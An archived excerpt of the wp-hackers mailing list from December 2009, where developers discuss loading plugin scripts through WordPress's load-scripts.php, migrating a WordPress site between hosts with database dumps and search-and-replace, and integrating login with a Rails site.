>> I was just curious. Is it possible to hook into load-styles.php /
>> load-scripts.php to load a custom CSS/JS file the same way WP loads the
>> files in wp-admin? Would be nice to get your own plugin javascript files
>> loaded minified/merged in load-scripts.php.
>>      
>
> http://codex.wordpress.org/Function_Reference/wp_enqueue_script
> <http://codex.wordpress.org/Function_Reference/wp_enqueue_script>
> http://codex.wordpress.org/Function_Reference/wp_enqueue_styles
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From msbasher at gmail.com  Tue Dec  1 19:41:58 2009
From: msbasher at gmail.com (Peter)
Date: Tue, 1 Dec 2009 11:41:58 -0800
Subject: [wp-hackers] Integrate site authentication with WordPress
Message-ID: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com>

I have a site built in ruby on rails that handles site-wide the user
authentication. I would like my users to be automatically logged in to
WordPress when they sign in using the rails site. Any suggestions?

Kind Regards,
Peter

From batmoo at gmail.com  Tue Dec  1 20:16:52 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Tue, 1 Dec 2009 15:16:52 -0500
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <4B156FF1.2020200@wpseek.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com> 
	<4B156FF1.2020200@wpseek.com>
Message-ID: <eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>

>
> I was just curious. Is it possible to hook into load-styles.php /

load-scripts.php to load a custom CSS/JS file the same way WP loads the

files in wp-admin? Would be nice to get your own plugin javascript files

loaded minified/merged in load-scripts.php.


Haven't looked into it deeply enough, but *wp_register_script* should work.


wp_register_script( $handle, $src, $deps = array(), $ver = false,
$in_footer = false )

--
Mohammad Jangda
www.digitalize.ca | @mjangda

From gundersson at gmail.com  Tue Dec  1 20:20:39 2009
From: gundersson at gmail.com (Christian Gundersson)
Date: Tue, 1 Dec 2009 21:20:39 +0100
Subject: [wp-hackers] Tips for moving a Wordpress install
Message-ID: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>

Hi,

I've been trying to find a good guide to moving a Wordpress installed site
from one location to another, more specifically from one host to another.

All guides I've found fail in one aspect or the other. Either they
completely disregard moving the media library(an important part in many of
my sites) or they move files but not metadata information.

There is always the complete database backup option using phpMyAdmin but
won't that screw with site urls etc?

How do you guys move from a development install to a live install site?

PS. If anyone can fill me in as to why media library info isn't included in
WPs built in import/export feature that would be nice to.

Thanks!

Regards
Christian

From mikeschinkel at newclarity.net  Tue Dec  1 20:30:00 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 1 Dec 2009 15:30:00 -0500
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
Message-ID: <4EE6BF46-DDF0-4501-B77D-693B6B91A604@newclarity.net>

> I've been trying to find a good guide to moving a Wordpress installed site
> from one location to another, more specifically from one host to another.

Are you trying to chance the domain name or use the same domain name?  I assume the latter?

-Mike Schinkel

On Dec 1, 2009, at 3:20 PM, Christian Gundersson wrote:

> Hi,
> 
> I've been trying to find a good guide to moving a Wordpress installed site
> from one location to another, more specifically from one host to another.
> 
> All guides I've found fail in one aspect or the other. Either they
> completely disregard moving the media library(an important part in many of
> my sites) or they move files but not metadata information.
> 
> There is always the complete database backup option using phpMyAdmin but
> won't that screw with site urls etc?
> 
> How do you guys move from a development install to a live install site?
> 
> PS. If anyone can fill me in as to why media library info isn't included in
> WPs built in import/export feature that would be nice to.
> 
> Thanks!
> 
> Regards
> Christian
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From harish.mlists at gmail.com  Tue Dec  1 20:33:17 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Tue, 01 Dec 2009 20:33:17 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
Message-ID: <4B157D8D.2030209@gmail.com>

Christian Gundersson wrote:
> Hi,
> 
> I've been trying to find a good guide to moving a Wordpress installed site
> from one location to another, more specifically from one host to another.
> 
> All guides I've found fail in one aspect or the other. Either they
> completely disregard moving the media library(an important part in many of
> my sites) or they move files but not metadata information.
> 
> There is always the complete database backup option using phpMyAdmin but
> won't that screw with site urls etc?
> 
> How do you guys move from a development install to a live install site?

1. Dump the database to a file.

2. Copy the entire file tree over to the new location.

3. Modify wp-config to match new domain/db details.

4. If you hard-coded anything like absolute paths into your data (e.g.
beta.foo.com/blog/2009/my-images/ instead of /blog/2009/my-images/), you
need to run a search and replace on your database dump file before
inserting it.

4a. Go to wp_options in the database dump and update the values for
'home' and 'siteurl.' (We've been through this a couple of times just
this last week.)

5. Reinsert the database contents in the new database.

Harish

From russgilbert at gmail.com  Tue Dec  1 20:38:37 2009
From: russgilbert at gmail.com (Russ Gilbert)
Date: Tue, 1 Dec 2009 12:38:37 -0800
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <4B157D8D.2030209@gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
Message-ID: <009401ca72c6$450b25d0$cf217170$@com>

if you're going to have the same URL on your new server, but it isn't live
yet and you don't want to have to deal with a search/replace that then needs
to be undone, you can set your machine to treat the new setup like it was
the old by making a change to your hosts file.

On a windows box, that's in c:/windows/system32/drivers/etc, and on a mac
it's /private/etc/hosts.txt

Put in the domain (www will need to be on a separate line) and the new
site's IP address, save the file, and close all open browsers.

Until you change the hosts file back, your computer will treat the new IP as
though it were the real site.  It's a great way to test configuration on a
new host before the domain points there.

Other than that, just go through the steps below.  

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harish
Narayanan
Sent: Tuesday, December 01, 2009 12:33 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Tips for moving a Wordpress install

Christian Gundersson wrote:
> Hi,
> 
> I've been trying to find a good guide to moving a Wordpress installed site
> from one location to another, more specifically from one host to another.
> 
> All guides I've found fail in one aspect or the other. Either they
> completely disregard moving the media library(an important part in many of
> my sites) or they move files but not metadata information.
> 
> There is always the complete database backup option using phpMyAdmin but
> won't that screw with site urls etc?
> 
> How do you guys move from a development install to a live install site?

1. Dump the database to a file.

2. Copy the entire file tree over to the new location.

3. Modify wp-config to match new domain/db details.

4. If you hard-coded anything like absolute paths into your data (e.g.
beta.foo.com/blog/2009/my-images/ instead of /blog/2009/my-images/), you
need to run a search and replace on your database dump file before
inserting it.

4a. Go to wp_options in the database dump and update the values for
'home' and 'siteurl.' (We've been through this a couple of times just
this last week.)

5. Reinsert the database contents in the new database.

Harish
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From gundersson at gmail.com  Tue Dec  1 20:41:07 2009
From: gundersson at gmail.com (Christian Gundersson)
Date: Tue, 1 Dec 2009 21:41:07 +0100
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <4B157D8D.2030209@gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
Message-ID: <d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com>

I've looked at this alternative, but as you mention in step 4 there will be
search and replacing since WP itself inserts absolute paths in posts when
you insert an image from media library.

And to answer Mikes question, almost all cases I'm interested in will be
moving from a local development platform to a public site which means that
the domain name/siteurl will change.

I was hoping that there would be a less cumbersome way of doing this step.

//Christian



2009/12/1 Harish Narayanan <harish.mlists at gmail.com>

> Christian Gundersson wrote:
> > Hi,
> >
> > I've been trying to find a good guide to moving a Wordpress installed
> site
> > from one location to another, more specifically from one host to another.
> >
> > All guides I've found fail in one aspect or the other. Either they
> > completely disregard moving the media library(an important part in many
> of
> > my sites) or they move files but not metadata information.
> >
> > There is always the complete database backup option using phpMyAdmin but
> > won't that screw with site urls etc?
> >
> > How do you guys move from a development install to a live install site?
>
> 1. Dump the database to a file.
>
> 2. Copy the entire file tree over to the new location.
>
> 3. Modify wp-config to match new domain/db details.
>
> 4. If you hard-coded anything like absolute paths into your data (e.g.
> beta.foo.com/blog/2009/my-images/ instead of /blog/2009/my-images/), you
> need to run a search and replace on your database dump file before
> inserting it.
>
> 4a. Go to wp_options in the database dump and update the values for
> 'home' and 'siteurl.' (We've been through this a couple of times just
> this last week.)
>
> 5. Reinsert the database contents in the new database.
>
> Harish
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From steve at sltaylor.co.uk  Tue Dec  1 20:53:30 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Tue, 1 Dec 2009 20:53:30 +0000
Subject: [wp-hackers] Integrate site authentication with WordPress
In-Reply-To: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com>
References: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com>
Message-ID: <a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com>

This might help:

http://lacquerhead.ca/2009/07/getting-other-applications-to-work-with-wordpress-users/

Steve

2009/12/1 Peter <msbasher at gmail.com>:
> I have a site built in ruby on rails that handles site-wide the user
> authentication. I would like my users to be automatically logged in to
> WordPress when they sign in using the rails site. Any suggestions?
>
> Kind Regards,
> Peter
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Tue Dec  1 20:55:02 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 1 Dec 2009 15:55:02 -0500
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
	<d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com>
Message-ID: <6463F1A4-3435-43A3-B03F-BE904D75675C@newclarity.net>

Dump the database to a SQL file.
Search for the old domain name prefixed with "http://" and replace with the new domain name also prefixed with "http://". 
Create a new database with the same name on the new server and import the modified SQL file.
Create a database user with the same name and password, and give it appropriate rights to the database.
Upload all files (PHP, CSS, images, etc.) using FTP from local into a directory mirror on your hosted server.
Done.

Note:
-- If you can't create a database and user with the same name and password, modify wp-config.php found in the website's root.
-- The search and replace *could* cause a problem if the domain name somehow matches incorrectly, but very unlikely.
-- You might also want to add two defines in wp-config.php, see http://codex.wordpress.org/Changing_The_Site_URL#Edit_wp-config.php

HTH.

-Mike Schinkel


On Dec 1, 2009, at 3:41 PM, Christian Gundersson wrote:

> I've looked at this alternative, but as you mention in step 4 there will be
> search and replacing since WP itself inserts absolute paths in posts when
> you insert an image from media library.
> 
> And to answer Mikes question, almost all cases I'm interested in will be
> moving from a local development platform to a public site which means that
> the domain name/siteurl will change.
> 
> I was hoping that there would be a less cumbersome way of doing this step.
> 
> //Christian
> 
> 
> 
> 2009/12/1 Harish Narayanan <harish.mlists at gmail.com>
> 
>> Christian Gundersson wrote:
>>> Hi,
>>> 
>>> I've been trying to find a good guide to moving a Wordpress installed
>> site
>>> from one location to another, more specifically from one host to another.
>>> 
>>> All guides I've found fail in one aspect or the other. Either they
>>> completely disregard moving the media library(an important part in many
>> of
>>> my sites) or they move files but not metadata information.
>>> 
>>> There is always the complete database backup option using phpMyAdmin but
>>> won't that screw with site urls etc?
>>> 
>>> How do you guys move from a development install to a live install site?
>> 
>> 1. Dump the database to a file.
>> 
>> 2. Copy the entire file tree over to the new location.
>> 
>> 3. Modify wp-config to match new domain/db details.
>> 
>> 4. If you hard-coded anything like absolute paths into your data (e.g.
>> beta.foo.com/blog/2009/my-images/ instead of /blog/2009/my-images/), you
>> need to run a search and replace on your database dump file before
>> inserting it.
>> 
>> 4a. Go to wp_options in the database dump and update the values for
>> 'home' and 'siteurl.' (We've been through this a couple of times just
>> this last week.)
>> 
>> 5. Reinsert the database contents in the new database.
>> 
>> Harish
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From harish.mlists at gmail.com  Tue Dec  1 20:55:13 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Tue, 01 Dec 2009 20:55:13 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>	<4B157D8D.2030209@gmail.com>
	<d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com>
Message-ID: <4B1582B1.9080000@gmail.com>

Christian Gundersson wrote:
> I've looked at this alternative, but as you mention in step 4 there will be
> search and replacing since WP itself inserts absolute paths in posts when
> you insert an image from media library.

I don't use the media library, so I did not know this. I don't think
absolute paths in the posts is a good idea (at the database data level,
anyway).

> And to answer Mikes question, almost all cases I'm interested in will be
> moving from a local development platform to a public site which means that
> the domain name/siteurl will change.
> 
> I was hoping that there would be a less cumbersome way of doing this step.

There is nothing cumbersome about these steps. It takes a matter of a
few minutes in total.

1. mysqldump --opt -uDB_USER1 -p -h DB_HOST1 DB_NAME1 > my_db_file
2. scp username1 at foo.com:~/path/to/wp username2 at bar.com:~/new/wp
3. emacs wp-config.php
4. sed -i 's/foo/bar/g' my_db_file > my_new_db_file
5. mysql -uDB_USER2 -p -h DB_HOST2 DB_NAME2 < my_new_db_file
6. Celebrate your site going live!

Harish

From office at wpseek.com  Tue Dec  1 21:04:33 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Tue, 01 Dec 2009 22:04:33 +0100
Subject: [wp-hackers] Hook into load-styles.php /
	load-scripts.php	"queue"?
In-Reply-To: <eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
Message-ID: <4B1584E1.7090108@wpseek.com>

That would be worth a try, thanks!

Although the codex example of wp_register_script is in combination with 
wp_enqueue_script which would result in an extra <script reference

http://codex.wordpress.org/Function_Reference/wp_enqueue_script#Load_scripts_only_on_plugin_pages

But let's see. I'll report back.


On 01.12.2009 21:16, Mohammad Jangda wrote:
>> I was just curious. Is it possible to hook into load-styles.php /
>>      
> load-scripts.php to load a custom CSS/JS file the same way WP loads the
>
> files in wp-admin? Would be nice to get your own plugin javascript files
>
> loaded minified/merged in load-scripts.php.
>
>
> Haven't looked into it deeply enough, but *wp_register_script* should work.
>
>
> wp_register_script( $handle, $src, $deps = array(), $ver = false,
> $in_footer = false )
>
> --
> Mohammad Jangda
> www.digitalize.ca | @mjangda
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>    

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From wordpress at zed1.com  Tue Dec  1 21:12:03 2009
From: wordpress at zed1.com (Mike Little)
Date: Tue, 1 Dec 2009 21:12:03 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <4B1582B1.9080000@gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com> 
	<4B157D8D.2030209@gmail.com>
	<d14758810912011241j7edf8cefqf77bf73b7b2e7ec6@mail.gmail.com> 
	<4B1582B1.9080000@gmail.com>
Message-ID: <7235ce780912011312wdfa4966p9a0cdff0b360465@mail.gmail.com>

A caution: The search and replace in the sql dump works for most of the time
(I use it all the time), but there can be problems.

The two big ones are:
1) some popular plugins insert full paths to your web directory either in
wp_options or worse in files. wp-super-cache and cformsII both come to mind.
2) those options in wp_options are often compex php serialized data. That
means the strings have their length encoded in the options. When you change
the urls in there and the length of the string changes, often things will
break in mysterious ways..


As to the media library stuff not being in the export, I guess it would get
cmbersome really quickly, you would have to encode the binary in some way.
The file would get big fast.
However, on import, it can fetch the media content on to the new server
(using the absolute urls in there), but only if the old site is we visible
to the new server (not your browser).




Mike

-- 
Mike Little
http://zed1.com/

From otto at ottodestruct.com  Tue Dec  1 21:23:12 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 1 Dec 2009 15:23:12 -0600
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
Message-ID: <161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>

On Tue, Dec 1, 2009 at 2:20 PM, Christian Gundersson
<gundersson at gmail.com> wrote:
> How do you guys move from a development install to a live install site?

Short answer: I don't. Not with content.

When developing plugins, themes, etc, then those are easy to move
around, generally speaking. The content, not so much. So I keep the
dev sites having test content only. I don't write posts and such on
dev and then move them to production, I write them on a staging or
production site, and just don't publish until I'm good and ready.

If you want to move an entire site, then yes, you're going to have to
do some searching and replacing on the sqldump. I've never had any
problems doing this, just make sure to keep the old database around
until you actually have the new site up and running.

Note that an Export/Import operation can indeed keep the media files
working properly, but it has to go directly to the other site to
retrieve the files in question. Because of this, your staging site
usually has to be internet visible. This is one reason I advice people
to keep their sites on live servers, in hidden directories and such.
Running localhost systems is fine for development, but not for
staging.

-Otto

From otto at ottodestruct.com  Tue Dec  1 21:25:22 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 1 Dec 2009 15:25:22 -0600
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <4B1584E1.7090108@wpseek.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com> 
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com> 
	<4B1584E1.7090108@wpseek.com>
Message-ID: <161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>

wp_enqueue_script is the correct way. The minify and compress stuff is
automatically handled, if it is enabled.

Just enqueue as normal, let WordPress deal with the rest.

-Otto
Sent from Memphis, TN, United States

From ncrice at gmail.com  Tue Dec  1 21:29:15 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 1 Dec 2009 16:29:15 -0500
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
	<4B1584E1.7090108@wpseek.com>
	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
Message-ID: <862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>

Out of curiosity, why aren't scripts minified using load_scripts.php when
using wp_enqueue_script in a theme?

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Tue, Dec 1, 2009 at 4:25 PM, Otto <otto at ottodestruct.com> wrote:

> wp_enqueue_script is the correct way. The minify and compress stuff is
> automatically handled, if it is enabled.
>
> Just enqueue as normal, let WordPress deal with the rest.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Tue Dec  1 21:34:31 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 1 Dec 2009 15:34:31 -0600
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com> 
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com> 
	<4B1584E1.7090108@wpseek.com>
	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com> 
	<862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
Message-ID: <161617690912011334q52e84294v21f526b533745d2@mail.gmail.com>

Actually, upon a further reading through the code, I see that it does
a check such that only scripts in the default directories get handled
in this manner. These would be the scripts in /wp-admin/js/ and
/wp-includes/js/ dirs. I didn't know it did that, though I can see
why...

To get your own scripts to get handled in this way, you'd need to
modify the $scripts variable. It would look something like this:

function my_scripts_adjuster( &$scripts ) {
$scripts->default_dirs[] = '/path/from/wp/root/to/my/dir/';
}
add_action( 'wp_default_scripts', 'my_scripts_adjuster',20);

I think that would do the trick.

-Otto
Sent from Memphis, TN, United States


On Tue, Dec 1, 2009 at 3:29 PM, Nathan Rice <ncrice at gmail.com> wrote:
> Out of curiosity, why aren't scripts minified using load_scripts.php when
> using wp_enqueue_script in a theme?
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice

From mikeschinkel at newclarity.net  Tue Dec  1 21:42:02 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 1 Dec 2009 16:42:02 -0500
Subject: [wp-hackers] Hosting Profiles (WAS: Tips for moving a Wordpress
	install)
In-Reply-To: <161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
Message-ID: <E5CE7854-6B8F-417C-B2A7-C2B6C4974739@newclarity.net>

On Dec 1, 2009, at 4:23 PM, Otto wrote:
> On Tue, Dec 1, 2009 at 2:20 PM, Christian Gundersson
> <gundersson at gmail.com> wrote:
>> How do you guys move from a development install to a live install site?
> 
> Short answer: I don't. Not with content.
> 
> When developing plugins, themes, etc, then those are easy to move
> around, generally speaking. The content, not so much. So I keep the
> dev sites having test content only. I don't write posts and such on
> dev and then move them to production, I write them on a staging or
> production site, and just don't publish until I'm good and ready.
> 
> If you want to move an entire site, then yes, you're going to have to
> do some searching and replacing on the sqldump. I've never had any
> problems doing this, just make sure to keep the old database around
> until you actually have the new site up and running.
> 
> Note that an Export/Import operation can indeed keep the media files
> working properly, but it has to go directly to the other site to
> retrieve the files in question. Because of this, your staging site
> usually has to be internet visible. This is one reason I advice people
> to keep their sites on live servers, in hidden directories and such.
> Running localhost systems is fine for development, but not for
> staging.

Sounds like something that could be addressed,] with a little effort, no?

What if we added the concept of "hosting profiles" to WordPress that allowed the admin to add additional hosting profiles? That would give future plugins the ability to add support for hosting profile and thus make it easier to move a site.  Let's say you move a site;  Wordpress could first check to see if it is located at the current default location and if not offer the user to login as admin and change the default location.

This would need to be a core feature because otherwise very few plugins would be likely to support it.

Anyone see a problem with this approach?  This could solve a problem that far too many people experience and make WordPress more accessible for serious use.

-Mike Schinkel

From office at wpseek.com  Tue Dec  1 21:42:26 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Tue, 01 Dec 2009 22:42:26 +0100
Subject: [wp-hackers] Hook into load-styles.php /
	load-scripts.php	"queue"?
In-Reply-To: <161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
	<4B1584E1.7090108@wpseek.com>
	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
Message-ID: <4B158DC2.5090707@wpseek.com>

Well, I do not exactly complain about the current way of adding scripts 
to a page via plugin. :-)
However, it would be a nice thing to load scripts like this

<script type='text/javascript' 
src='wp-admin/load-scripts.php?c=1&amp;load=jquery,utils,sack,/plugin-script-handler1,//plugin-script-handler2/&amp;ver=97388699f39a28aaba58ae0d13b799c3'></script>

instead of

<script type='text/javascript' 
src='wp-content/plugins/plugin1/admin_scripts.js?ver=1.2'></script>
<script type='text/javascript' 
src='wp-content/plugins/plugin2/admin_scripts.js?ver=2.9-beta-1'></script>
<script type='text/javascript' 
src='wp-content/plugins/plugin3/admin_scripts.js?ver=2.9-beta-1'></script>

Regards


On 01.12.2009 22:25, Otto wrote:
> wp_enqueue_script is the correct way. The minify and compress stuff is
> automatically handled, if it is enabled.
>
> Just enqueue as normal, let WordPress deal with the rest.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>    

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From gundersson at gmail.com  Tue Dec  1 21:44:15 2009
From: gundersson at gmail.com (Christian Gundersson)
Date: Tue, 1 Dec 2009 22:44:15 +0100
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
Message-ID: <d14758810912011344t60344b4fm559c1160d9835d28@mail.gmail.com>

Harish,

1. mysqldump --opt -uDB_USER1 -p -h DB_HOST1 DB_NAME1 > my_db_file
2. scp username1 at foo.com:~/path/to/wp username2 at bar.com:~/new/wp
3. emacs wp-config.php
4. sed -i 's/foo/bar/g' my_db_file > my_new_db_file
5. mysql -uDB_USER2 -p -h DB_HOST2 DB_NAME2 < my_new_db_file
6. Celebrate your site going live!

This is not obvious nor trivial for the uninitiated ;) (Exept perhaps step
6, I got that down to an art form)

Thanks for all the replies, I'll take this to heart and plan with this in
mind hereafter. I'm gearing up on my WP skills and hopefully I'll be able to
contribute to this "problem" one way or the other.

//Christian

2009/12/1 Otto <otto at ottodestruct.com>

> On Tue, Dec 1, 2009 at 2:20 PM, Christian Gundersson
> <gundersson at gmail.com> wrote:
> > How do you guys move from a development install to a live install site?
>
> Short answer: I don't. Not with content.
>
> When developing plugins, themes, etc, then those are easy to move
> around, generally speaking. The content, not so much. So I keep the
> dev sites having test content only. I don't write posts and such on
> dev and then move them to production, I write them on a staging or
> production site, and just don't publish until I'm good and ready.
>
> If you want to move an entire site, then yes, you're going to have to
> do some searching and replacing on the sqldump. I've never had any
> problems doing this, just make sure to keep the old database around
> until you actually have the new site up and running.
>
> Note that an Export/Import operation can indeed keep the media files
> working properly, but it has to go directly to the other site to
> retrieve the files in question. Because of this, your staging site
> usually has to be internet visible. This is one reason I advice people
> to keep their sites on live servers, in hidden directories and such.
> Running localhost systems is fine for development, but not for
> staging.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From steve at sltaylor.co.uk  Tue Dec  1 21:44:27 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Tue, 1 Dec 2009 21:44:27 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
Message-ID: <a21f8bf00912011344l7e65b31ap58590cb82c358343@mail.gmail.com>

I wrote a guide based on my experiences:

http://sltaylor.co.uk/blog/moving-wordpress-new-domain-server/

It includes gotchas for plugins like cforms. As has been mentioned,
serialized arrays are an issue. There's a section on that in the
above, which points to a useful fix:

http://www.davesgonemental.com/php-serialization-fix-for-wordpress-migrations/

Back up, and good luck!

Steve

From office at wpseek.com  Tue Dec  1 21:44:43 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Tue, 01 Dec 2009 22:44:43 +0100
Subject: [wp-hackers] Hook into load-styles.php /
	load-scripts.php	"queue"?
In-Reply-To: <161617690912011334q52e84294v21f526b533745d2@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
	<4B1584E1.7090108@wpseek.com>	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
	<862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
	<161617690912011334q52e84294v21f526b533745d2@mail.gmail.com>
Message-ID: <4B158E4B.1030404@wpseek.com>

Wow, thanks a bunch!

Will try that.

Regards,
Oliver


